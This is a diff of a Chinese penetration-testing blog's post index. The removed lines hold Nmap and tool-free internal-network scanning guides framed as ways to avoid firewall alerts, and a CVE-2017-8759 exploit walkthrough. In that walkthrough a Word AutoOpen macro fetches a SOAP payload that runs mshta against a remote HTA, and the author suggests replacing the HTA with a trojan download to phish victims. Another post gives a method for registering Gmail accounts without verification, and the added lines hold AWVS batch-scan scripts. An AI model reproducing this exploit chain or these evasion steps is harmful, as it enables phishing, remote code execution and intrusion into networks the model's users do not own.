-<p>-oS   “1337格式” 保存扫描结果输出<br>-oN  把扫描结果重定向到一个可读的文件logfilename中<br>-oM  每个结果一行输出<br>-oA 同上<br>–append-output 附在原来的结果前面</p>
-</blockquote>
-<h2 id="Nmap端口6个状态"><a href="#Nmap端口6个状态" class="headerlink" title="Nmap端口6个状态"></a>Nmap端口6个状态</h2><blockquote>
-<p>open（开放的）<br>closed（关闭的）<br>filtered（被过滤的）不确定开放还是关闭<br>unfiltered （未被过滤的）<br>openfiltered （开放或者被过滤的）<br>closedfiltered （关闭或者未被过滤的）</p>
-</blockquote>
-<h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><h3 id="获取远程主机的系统类型及开放端口"><a href="#获取远程主机的系统类型及开放端口" class="headerlink" title="获取远程主机的系统类型及开放端口"></a>获取远程主机的系统类型及开放端口</h3><blockquote>
-<p>nmap -sS -P0 -sV -O</p>
-</blockquote>
-<h3 id="获取ip和mac地址："><a href="#获取ip和mac地址：" class="headerlink" title="获取ip和mac地址："></a>获取ip和mac地址：</h3><blockquote>
-<p>nmap -sP -PI -PT -oN 192.168.1.0/24</p>
-</blockquote>
-<h3 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h3><blockquote>
-<p>nmap -sP -n 192.168.10.0/24 | cut -d” “ -f5 | awk “/192/“</p>
-</blockquote>
-<p>windows:</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sP -n <span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span> | <span class="built_in">find</span> "<span class="number">192</span>" &gt;tmp_active001&amp;<span class="keyword">for</span> /f "tokens=<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>" %i <span class="keyword">in</span> (tmp_active001)<span class="keyword">do</span> @<span class="built_in">echo</span> %m</div></pre></td></tr></table></figure>
-<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>漏洞脚本根据Nmap,GitHub官方项目script文件夹下查看:<a href="https://github.com/nmap/nmap/tree/master/scripts" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/nmap/nmap/tree/master/scripts</a></p>
-<blockquote>
-<p>nmap -P0 –script=smb-check-vulns –script-args=unsafe=1 -iL ip.txt</p>
-</blockquote>
-<h2 id="扫描常见端口"><a href="#扫描常见端口" class="headerlink" title="扫描常见端口:"></a>扫描常见端口:</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sT -O -P0 -T5 --open -oN result.txt -p80-<span class="number">89</span>,<span class="number">8080</span>-<span class="number">8099</span>,<span class="number">8000</span>-<span class="number">8009</span>,<span class="number">7001</span>-<span class="number">7009</span>,<span class="number">9000</span>-<span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">28017</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">49705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> <span class="number">63</span>.<span class="number">237</span>.<span class="number">172</span>.<span class="number">115</span>/<span class="number">24</span></div></pre></td></tr></table></figure>
-<blockquote>
-<p>21  ftp  主要看是否支持匿名，也可以跑弱口令<br>80  web  常见web漏洞以及是否为一些管理后台<br>443  openssl  心脏滴血以及一些web漏洞测试<br>873  rsync  主要看是否支持匿名，也可以跑弱口令<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>4440 rundeck  参考WooYun: 借用新浪某服务成功漫游新浪内网<br>6082  varnish  参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379  redis 一般无认证，可直接访问<br>8000-9090  都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>9200  elasticsearch  参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211  memcache  未授权访问<br>27017  mongodb  未授权访问<br>28017  mongodb统计页面</p>
-</blockquote>
-<h2 id="扫描巨大网络"><a href="#扫描巨大网络" class="headerlink" title="扫描巨大网络"></a>扫描巨大网络</h2><blockquote>
-<p>-sn    不扫描端口，只ping主机<br>-PE   通过ICMP echo判定主机是否存活<br>-n     不反向解析IP地址到域名<br>–min-hostgroup 1024    最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描<br>–min-parallelism 1024  这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024<br>-oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml</p>
-</blockquote>
-<p>扫描结束，解析XML文档即可得到哪些IP地址存活.</p>
-<p>附上自己平时用的nmap命令，由于之前发包太大vps被封过一次，所以加了一些限速的参数</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-<span class="number">89</span>,<span class="number">8080</span>-<span class="number">8099</span>,<span class="number">8000</span>-<span class="number">8009</span>,<span class="number">7001</span>-<span class="number">7009</span>,<span class="number">9000</span>-<span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">28017</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">49705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> -iL ip.txt</div></pre></td></tr></table></figure>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sT -sV -p80-<span class="number">89</span>,<span class="number">8080</span>-<span class="number">8099</span>,<span class="number">8000</span>-<span class="number">8009</span>,<span class="number">7001</span>-<span class="number">7009</span>,<span class="number">9000</span>-<span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">28017</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">49705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> --open --max-hostgroup <span class="number">10</span> --max-parallelism <span class="number">10</span> --max-rtt-timeout <span class="number">1000</span>ms --host-timeout <span class="number">800</span>s --max-scan-delay <span class="number">2000</span>ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt</div></pre></td></tr></table></figure>
-<h1 id="WindoWs自带命令端口扫描及powershell"><a href="#WindoWs自带命令端口扫描及powershell" class="headerlink" title="WindoWs自带命令端口扫描及powershell"></a>WindoWs自带命令端口扫描及powershell</h1><h2 id="bat批量ping获取iP"><a href="#bat批量ping获取iP" class="headerlink" title="bat批量ping获取iP"></a>bat批量ping获取iP</h2><figure class="highlight bat"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@<span class="built_in">echo</span> off</div><div class="line"><span class="built_in">setlocal</span> ENABLEDELAYEDEXPANSION</div><div class="line">@<span class="keyword">FOR</span> /F "usebackq eol=- skip=<span class="number">1</span> delims=\" <span class="variable">%%j</span> <span class="keyword">IN</span> (`<span class="built_in">net</span> view ^| <span class="built_in">find</span> "命令成功完成" /v ^|<span class="built_in">find</span> "The command completed successfully." /v`) <span class="keyword">DO</span> (</div><div class="line">@<span class="keyword">FOR</span> /F "usebackq delims=" <span class="variable">%%i</span> <span class="keyword">IN</span> (`@<span class="built_in">ping</span> -n <span class="number">1</span> -<span class="number">4</span> <span class="variable">%%j</span> ^| <span class="built_in">findstr</span> "Pinging"`) <span class="keyword">DO</span> (</div><div class="line">@<span class="keyword">FOR</span> /F "usebackq tokens=<span class="number">2</span> delims=[]" <span class="variable">%%k</span> <span class="keyword">IN</span> (`<span class="built_in">echo</span> <span class="variable">%%i</span>`) <span class="keyword">DO</span> (<span class="built_in">echo</span> <span class="variable">%%k</span> <span class="variable">%%j</span>)</div><div class="line">)</div><div class="line">)</div></pre></td></tr></table></figure>
-<h2 id="内网无工具扫描"><a href="#内网无工具扫描" class="headerlink" title="内网无工具扫描"></a>内网无工具扫描</h2><p>一条 cmd 命令解决：</p>
-<blockquote>
-<p>for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i “ttl”<br>ping 整个 c 段，只输出有响应的主机。</p>
-<p>% H” g% Q+ _6 q- P7 t<br>更变态的：</p>
-<p>4 o4 g8 X- v9 x&amp; w<br>域机器对应 IP</p>
-<p>FOR /F “eol=- tokens=1 delims=\ “ %a IN (‘net view’) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 |<br>find /i “ttl” &amp; echo.)<br>把 net view 的结果，挨个 ping 一遍，并输出机器名和 ip 地址。</p>
-</blockquote>
-<p>找主机名</p>
-<blockquote>
-<p>for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”<br>B 段查找</p>
-<p>for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”<br>Win7</p>
-<p>for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”<br>for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”<br>改成</p>
-<p>for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Ping”<br>for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Ping”<br>就可以兼容 Win7 了。（Win7 ping -a 输出结果关键词为 “Ping”）</p>
-</blockquote>
-<p>另外findstr /i “pinging” 或 findstr /i “ping” 可以换成 findstr “[” 的 可以适合多语言环境</p>
-<h2 id="PowerShell-IPv4NetworkScanner"><a href="#PowerShell-IPv4NetworkScanner" class="headerlink" title="PowerShell_IPv4NetworkScanner"></a>PowerShell_IPv4NetworkScanner</h2><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">.\IPv4NetworkScan.ps1 [-StartIPv4Address] &lt;IPAddress&gt; [-EndIPv4Address] &lt;IPAddress&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;]</div><div class="line"></div><div class="line">.\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-Mask] &lt;String&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;]</div><div class="line"></div><div class="line">.\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-CIDR] &lt;Int32&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;]</div></pre></td></tr></table></figure>
-<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PS&gt; .\IPv4NetworkScan.ps1 -StartIPv4Address <span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">0</span> -EndIPv4Address <span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">20</span></div><div class="line"></div><div class="line">IPv4Address   Status Hostname</div><div class="line">-----------   ------ --------</div><div class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">1</span> Up     fritz.box</div></pre></td></tr></table></figure>
-<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address <span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">0</span> -Mask <span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">0</span> -DisableDNSResolving</div><div class="line"></div><div class="line">IPv4Address    Status</div><div class="line">-----------    ------</div><div class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">1</span>  Up</div><div class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">22</span> Up</div></pre></td></tr></table></figure>
-<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address <span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">0</span> -CIDR <span class="number">25</span> -EnableMACResolving</div><div class="line"></div><div class="line">IPv4Address    Status Hostname           MAC               Vendor</div><div class="line">----------- ------ --------           ---               ------</div><div class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">1</span>  Up     fritz.box          XX-XX-XX-XX-XX-XX AVM Audiovisuelles Marketing und &gt;Computersysteme GmbH</div><div class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">22</span> Up     XXXXX-PC.fritz.box XX-XX-XX-XX-XX-XX ASRock Incorporation</div></pre></td></tr></table></figure>
-<p>下载链接: <a href="https://github.com/BornToBeRoot/PowerShell_IPv4NetworkScanner.git" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/BornToBeRoot/PowerShell_IPv4NetworkScanner.git</a></p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>建议大家在内网渗透中尽量使用内网无工具或PowerShell进行端口探测与扫描,防止防火墙报警、拦截</p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
-<li><a href="http://wolvez.club/?p=480" rel="external nofollow noopener noreferrer" target="_blank">nmap语法</a></li>
-<li><a href="http://www.mottoin.com/92978.html" rel="external nofollow noopener noreferrer" target="_blank">内网渗透测试定位技术总结</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 渗透教程 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 漏洞利用 </tag>
-            
-            <tag> 渗透教程 </tag>
-            
-            <tag> nmap中文教程 </tag>
-            
-            <tag> 端口扫描 </tag>
-            
-            <tag> 漏洞扫描 </tag>
-            
-            <tag> 内网渗透 </tag>
-            
-            <tag> 防火墙 </tag>
-            
-            <tag> powershell端口扫描 </tag>
-            
-            <tag> bat端口扫描 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[CVE-2017-8759-微软.net远程代码执行漏洞复现]]></title>
-      <url>/2017/09/14/CVE-2017-8759-Exploit/</url>
-      <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>漏洞名称：.NET Framework远程代码执行漏洞<br>漏洞编号：CVE-2017-8759<br>漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统<br>利用场景：远程钓鱼、社会工程（打开有惊喜哟）<br>影响版本：以下.NET版本<br>    Microsoft .NET Framework 4.6.2<br>    Microsoft .NET Framework 4.6.1<br>    Microsoft .NET Framework 3.5.1<br>    Microsoft .NET Framework 4.7<br>    Microsoft .NET Framework 4.6<br>    Microsoft .NET Framework 4.5.2<br>    Microsoft .NET Framework 3.5<br>    Microsoft .NET Framework 2.0 SP2<br>影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint<br>加固方法：软件类漏洞，微软补丁会悄悄地告诉你<br><a href="https://portal.msrc.microsoft.com/en-us/security-guidance" rel="external nofollow noopener noreferrer" target="_blank">https://portal.msrc.microsoft.com/en-us/security-guidance</a></p>
-<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><blockquote>
-<p>本次测试环境:Windows 2007 x64、Kali Linux X64、Python、Office Word 2016 X64</p>
-</blockquote>
-<p>本次测试攻击利用Word宏,其他方法暂未测试.</p>
-<h2 id="从GitHub下载文件"><a href="#从GitHub下载文件" class="headerlink" title="从GitHub下载文件"></a>从GitHub下载文件</h2><pre><code>git clone https://github.com/Voulnet/CVE-2017-8759-Exploit-sample.git
-</code></pre><h2 id="修改文件夹exploit-txt内容"><a href="#修改文件夹exploit-txt内容" class="headerlink" title="修改文件夹exploit.txt内容"></a>修改文件夹exploit.txt内容</h2><pre><code>&lt;soap:address location=&quot;http://127.0.0.1:8080?C:\Windows\System32\mshta.exe?http://127.0.0.1:8080/cmd.hta&quot;/&gt;
-</code></pre><p>  soap标签内的ip地址替换成你的Web服务器地址</p>
-<p><img src="http://ovqjzu5ds.bkt.clouddn.com/b91a93af39ddc3689ce4650b90556b86.png" alt="修改Http服务Ip地址"></p>
-<h2 id="修改cmd-hta内容"><a href="#修改cmd-hta内容" class="headerlink" title="修改cmd.hta内容"></a>修改cmd.hta内容</h2><p>本次不做修改,仅做测试[替换标注内容为木马下载链接或其他姿势进行远程攻击]</p>
-<p><img src="http://ovqjzu5ds.bkt.clouddn.com/3898eea3f7bcc0e65159b05590888dd3.png" alt="cmdhta修改"></p>
-<h2 id="启动Http服务器"><a href="#启动Http服务器" class="headerlink" title="启动Http服务器"></a>启动Http服务器</h2><pre><code>python -m SimpleHTTPServer 8080
-</code></pre><h2 id="新建word文档"><a href="#新建word文档" class="headerlink" title="新建word文档"></a>新建word文档</h2><p>  可以利用从GitHub下载的word直接修改宏,在这里我给大家直接新建演示一次.</p>
-<p>新建一个格式为doc的文档,内容自定义主要目的是利用社工诱导用户打开文档及相信该文档是正常文档未涉及钓鱼攻击.</p>
-<p>新建宏步骤:视图-宏-宏名”AutoOpen”-创建,输入代码为:</p>
-<pre><code>Sub AutoOpen()
-Set x = GetObject(&quot;soap:wsdl=http://127.0.0.1:8080/exploit.txt&quot;)
-End Sub
-</code></pre><p>同样上面的IP替换你的Http服务器地址</p>
-<p><img src="http://ovqjzu5ds.bkt.clouddn.com/9fbe01e3c0b9d1b15acf412dcaa22b43.png" alt="宏名"></p>
-<p>Ctrl+s保存一下,然后点右上角的word图标返回到word界面.</p>
-<h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p>由于我先前测试时启用了宏,所以没有提示,首次运行会提示需要启用宏.打开文档会生成三个文件在当前路径下.</p>
-<p><img src="http://ovqjzu5ds.bkt.clouddn.com/e31kh41321234123jh.gif" alt="运行结果"></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
-<li><a href="http://mp.weixin.qq.com/s?timestamp=1505395851&amp;src=3&amp;ver=1&amp;signature=Pz9jna73kaP-IyzHn*bKH5irhtoFJ5AELMHRDjhL9tYfSqS1EKXFDBqvgXMTuqL98G1ujtmI6aIbWOs5dff9GfHyZIJVhdBnCiu-QXL*uMERjmoO02zpVh-mOJPio9HuFGtZPe22zRbdm3W*Lbn*P24caa96rOt1tXrD98r07PA=" rel="external nofollow noopener noreferrer" target="_blank">微软.NET远程代码执行漏洞0day分析(社工钓鱼)</a></li>
-<li><a href="https://www.youtube.com/watch?v=hlkx5uYBT1Y" rel="external nofollow noopener noreferrer" target="_blank">CVE-2017-8759-Weaponisation Tutorial</a></li>
-<li><a href="https://www.youtube.com/watch?v=nHXKnTTtWk8" rel="external nofollow noopener noreferrer" target="_blank">CVE2017-8759 - RTF WSDL SOAP Parser Vulnerability 1-day</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 漏洞利用 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 漏洞利用 </tag>
-            
-            <tag> exploit </tag>
-            
-            <tag> cve-2017-8759 </tag>
-            
-            <tag> 微软漏洞 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[匿名注册谷歌邮箱[实测可用]]]></title>
-      <url>/2017/09/13/anonymous-register-gmail/</url>
-      <content type="html"><![CDATA[<blockquote>
-<p>不需要邮箱验证，不需要手机验证</p>
-</blockquote>
-<h1 id="注册步骤"><a href="#注册步骤" class="headerlink" title="注册步骤:"></a>注册步骤:</h1><ol>
-<li><p>从 www.gmail.com 入口，点击注册。</p>
-</li>
-<li><p>姓氏要手打。（No老师说的）</p>
-</li>
-<li><p>电话区域的区号选择 特克斯和凯科斯群岛 (Turks &amp; Caicos Islands)</p>
-</li>
-<li><p>邮件区域不用填写</p>
-</li>
-<li><p>地区选择 特里斯坦-达库尼亚群岛 (Tristan da Cunha)</p>
-</li>
-</ol>
-<h1 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果:"></a>测试结果:</h1><p>需使用香港未注册gmail账户的Ss&amp;Vpn,才能注册成功,不建议批量注册及频繁注册</p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
-<li><a href="http://www.evilclay.com/2016/08/21/%E5%8C%BF%E5%90%8D%E6%B3%A8%E5%86%8CGoogle%E9%82%AE%E7%AE%B1/" title="匿名注注册Google邮箱" rel="external nofollow noopener noreferrer" target="_blank">匿名注注册Google邮箱</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 福利 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 匿名注册谷歌邮箱 </tag>
-            
-            <tag> 香港Vpn </tag>
-            
-            <tag> Gmail </tag>
-            
-        </tags>
-        
-    </entry>
-    
-  
-  
+<search>
+  <entry>
+    <title><![CDATA[手工查看当前网站的HTTPSERVER信息]]></title>
+    <url>%2F2017%2F09%2F20%2Flook-httpserver-method%2F</url>
+    <content type="text"><![CDATA[简述 HTTPSERVER是每个网站搭建所用的web容器标识,例如常见:IIS、Apache、Nginx,今天教大家如何手工利用谷歌浏览器查看。 手工具体步骤1、打开谷歌浏览器 2、地址栏输入”www.shouyihuo.com”,这个Url是我随便找的 3、在页面空白处鼠标右键-检查/审查元素,然后网页页面的右边会弹出一个栏目 4、为了方便查看点击栏目x旁边竖着三个点，然后点击倒数第三个”Dock to boottom” 5、栏目就会到网页页面下方,在栏目菜单栏选择第三个”Network”浏览器刷新页面就会有一堆Url参数 6、我一般选择第一个链接点击进去,就可以看到当前Url的HTTPSERVER信息 结语此方法可以在所有浏览器使用,但是在操作步骤可能略有不同.]]></content>
+      <categories>
+        <category>技术问题解答</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
+        <tag>httpserver信息</tag>
+        <tag>网站</tag>
+        <tag>chrome</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[AWVS各类脚本]]></title>
+    <url>%2F2017%2F09%2F18%2Facunetix-web-vulnerability-scanner-11%2F</url>
+    <content type="text"><![CDATA[简述Acunetix Web Vulnerability Scanner是一个网站及服务器漏洞扫描软件，它包含有收费和免费两种版本。 启动&amp;停止脚本 下面代码复制另存为awvs.bat1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556@echo offmode con lines=30 cols=60clscolor 2fecho.-----------------------------------------------------------echo.请选择使用：echo.echo. 1.启动Awvs 11（即在下面输入1）echo.echo. 2.停止Awvs 11（即在下面输入2）echo.-----------------------------------------------------------if exist "%SystemRoot%\System32\choice.exe" goto Win7Choiceset /p choice=请输入数字并按回车键确认:echo.if %choice%==1 goto StartAwvsif %choice%==2 goto StopAwvscls"set choice="echo 您输入有误，请重新选择。goto main:Win7Choicechoice /c 12 /n /m "请输入相应数字："if errorlevel 2 goto StopAwvsif errorlevel 1 goto StartAwvsclsgoto main:StartAwvsclscolor 2fnet start Acunetixnet start "Acunetix Database"echo.-----------------------------------------------------------echo.echo 成功启动 "Acunetix"，"Acunetix Database" 服务！echo.goto end:StopAwvsclscolor 2fnet stop Acunetixnet stop "Acunetix Database"echo.-----------------------------------------------------------echo.echo 成功关闭 "Acunetix"，"Acunetix Database" 服务！echo.goto end:endecho 请按任意键退出。@Pause&gt;nul 批量添加扫描URL 该脚本为Python语言,使用前请安装Python. 1、将下列代码复制另存为”awvs11批量扫描删除.py” 2、全文搜索localhost:3443,全部替换为你awvs所在的服务器及端口 3、username填你的账户名,pw填你的密码,是sha256加密后的密码 4、把要添加的url列表保存成testawvs.txt文件，放在该脚本所在目录运行该脚本。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#-*- coding:utf-8 -*-import urllib2import sslimport json__author="jamesj"#localhost:3443全部替换为awvs所在的服务器及端口username='mail@mail.com'#账号邮箱pw='sha256加密后的密码'#sha256加密后的密码，通过burp抓包可获取,也可以使用(http://tool.oschina.net/encrypt?type=2)把密码进行加密之后填入，请区分大小写、中英文字符。#以上内容为配置内容，然后把要添加的url列表保存成testawvs.txt文件，放在该脚本下运行该脚本。ssl._create_default_https_context = ssl._create_unverified_contexturl_login="https://localhost:3443/api/v1/me/login"send_headers_login=&#123;'Host': 'localhost:3443','Accept': 'application/json, text/plain, */*','Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3','Accept-Encoding': 'gzip, deflate, br','Content-Type': 'application/json;charset=utf-8'&#125;data_login='&#123;"email":"'+username+'","password":"'+pw+'","remember_me":false&#125;'req_login = urllib2.Request(url_login,headers=send_headers_login)response_login = urllib2.urlopen(req_login,data_login)xauth = response_login.headers['X-Auth']COOOOOOOOkie = response_login.headers['Set-Cookie']print "当前验证信息如下\r\n cookie : %r \r\n X-Auth : %r "%(COOOOOOOOkie,xauth)send_headers2=&#123; 'Host':'localhost:3443', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Content-Type':'application/json;charset=utf-8', 'X-Auth':xauth, 'Cookie':COOOOOOOOkie &#125;#以上代码实现登录（获取cookie）和校验值def add_exec_scan(): url="https://localhost:3443/api/v1/targets" try: urllist=open('testawvs.txt','r')#这是要添加的url列表 formaturl=urllist.readlines() for i in formaturl: target_url='http://'+i.strip() data='&#123;"description":"222","address":"'+target_url+'","criticality":"10"&#125;' #data = urllib.urlencode(data)由于使用json格式所以不用添加 req = urllib2.Request(url,headers=send_headers2) response = urllib2.urlopen(req,data) jo=json.loads(response.read()) target_id=jo['target_id']#获取添加后的任务ID #print target_id #以上代码实现批量添加 url_scan="https://localhost:3443/api/v1/scans" headers_scan=&#123; 'Host': 'localhost:3443', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/json;charset=utf-8', 'X-Auth':xauth, 'Cookie':COOOOOOOOkie, 